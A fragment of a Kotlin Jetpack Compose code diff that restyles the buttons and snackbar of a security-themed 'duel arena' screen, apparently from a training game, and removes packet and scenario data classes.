-        colors = ButtonDefaults.buttonColors(containerColor = cobaltBlue),
-        shape = RoundedCornerShape(8.dp)
-      ) {
-        Text("CHALLENGE AI", color = Color.White, fontWeight = FontWeight.Bold)
-      }
+      )
+
+      PalantirMatteButton(
+        text = "CHALLENGE AI",
+        onClick = {
+          if (!isLoading) {
+            isLoading = true
+            try {
+              handleDuelDecision(userAcceptedClaim = false)
+            } finally {
+              isLoading = false
+            }
+          }
+        },
+        enabled = !isLoading,
+        isLoading = isLoading,
+        containerColor = cobaltBlue,
+        contentColor = Color.White,
+        borderColor = cobaltBlue,
+        shape = RoundedCornerShape(8.dp),
+        isMonospace = true,
+        testTag = "duel_challenge_ai_button",
+        modifier = Modifier
+          .weight(1f)
+          .height(50.dp)
+      )
+
+      PalantirMatteButton(
+        text = if (isExportingPdf) "GENERATING..." else "EXPORT DOSSIER",
+        onClick = {
+          if (!isExportingPdf) {
+            exportDossierPdf()
+          }
+        },
+        enabled = !isExportingPdf,
+        isLoading = isExportingPdf,
+        containerColor = Color(0xFF1B2332),
+        contentColor = Color(0xFF38BDF8),
+        borderColor = Color(0xFF0284C7),
+        shape = RoundedCornerShape(8.dp),
+        isMonospace = true,
+        testTag = "export_dossier_button",
+        modifier = Modifier
+          .weight(1.2f)
+          .height(50.dp)
+      )
+    }
+  }
+
+  // Sleek dark-themed Snackbar with Cobalt Blue text
+  SnackbarHost(
+    hostState = snackbarHostState,
+    modifier = Modifier
+      .align(Alignment.BottomCenter)
+      .padding(16.dp)
+      .testTag("duel_arena_snackbar_host")
+  ) { data ->
+    Snackbar(
+      modifier = Modifier.border(BorderStroke(1.dp, slateBorder), RoundedCornerShape(8.dp)),
+      containerColor = matteSteel,
+      contentColor = cobaltBlue,
+      shape = RoundedCornerShape(8.dp)
+    ) {
+      Text(
+        text = data.visuals.message,
+        color = cobaltBlue,
+        fontWeight = FontWeight.SemiBold,
+        fontSize = 13.sp
+      )
     }
   }
 }
-
-data class ScapyParsedPacket(
-  val number: Int,
-  val timestamp: String,
-  val protocol: String,
-  val flags: String,
-  val ethSrc: String,
-  val ethDst: String,
-  val ipSrc: String,
-  val ipDst: String,
-  val layers: String,
-  val summary: String,
-  val payloadHex: String = "",
-  val payloadAscii: String = "",
-  val isSuspicious: Boolean = false
-)
-
-private data class DuelScenario(
-  val id: String,
-  val adversary: String,
-  val rawTelemetry: String,
-  val decodedPayload: String,
-  val aiClaim: String,
-  val isAiHallucinating: Boolean,
-  val explanation: String,
-  val pcapPackets: List<ScapyParsedPacket> = emptyList()
-)
+}
